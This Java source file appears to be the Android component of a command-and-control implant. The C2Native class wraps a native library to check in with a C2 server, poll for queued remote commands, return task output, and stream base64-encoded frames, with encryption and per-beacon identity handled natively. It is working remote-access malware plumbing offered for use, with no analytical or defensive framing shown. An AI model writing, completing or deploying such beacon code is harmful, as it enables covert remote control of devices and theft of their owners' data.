package com.phantom.remote;

/**
 * Thin Java facade over the shared C2 core (native_bridge.cpp -> remote_net.h).
 *
 * Transport, AES-256-GCM crypto and the per-beacon HMAC identity live in the
 * native layer so the Android module is wire-compatible with the desktop
 * remote module and the beacon. This class only marshals strings/arrays.
 */
public final class C2Native {

    static {
        System.loadLibrary("phantom_remote");
    }

    private C2Native() {
    }

    /** Server hello / key validation. Returns decrypted response or "". */
    public static native String nativeCheckin();

    /**
     * Poll for queued tasks. Each array element is "taskId\u0001command".
     */
    public static native String[] nativePoll();

    /** Send a task result back to the C2. */
    public static native boolean nativeSendResult(String taskId, String output);

    /** Send a streamed frame against the task that started streaming. */
    public static native boolean nativeSendStream(String taskId, String frameB64);

    public static String checkin() {
        return nativeCheckin();
    }

    public static String poll() {
        String[] recs = nativePoll();
        if (recs == null) return "";
        StringBuilder sb = new StringBuilder();
        for (String r : recs) {
            sb.append(r).append('\n');
        }
        return sb.toString();
    }

    /** Parse the poll() output into records. */
    public static String[] parseTasks(String body) {
        if (body == null || body.isEmpty()) return new String[0];
        String[] raw = body.split("\n");
        java.util.ArrayList<String> out = new java.util.ArrayList<>();
        for (String r : raw) {
            if (!r.isEmpty()) out.add(r);
        }
        return out.toArray(new String[0]);
    }

    /** Split "taskId\u0001command" into {taskId, command}. */
    public static String[] taskFields(String record) {
        if (record == null) return null;
        int idx = record.indexOf('\u0001');
        if (idx < 0) return null;
        return new String[]{record.substring(0, idx), record.substring(idx + 1)};
    }

    public static boolean sendResult(String taskId, String output) {
        return nativeSendResult(taskId, output);
    }

    public static boolean sendStream(String taskId, String frame) {
        return nativeSendStream(taskId, frame);
    }
}
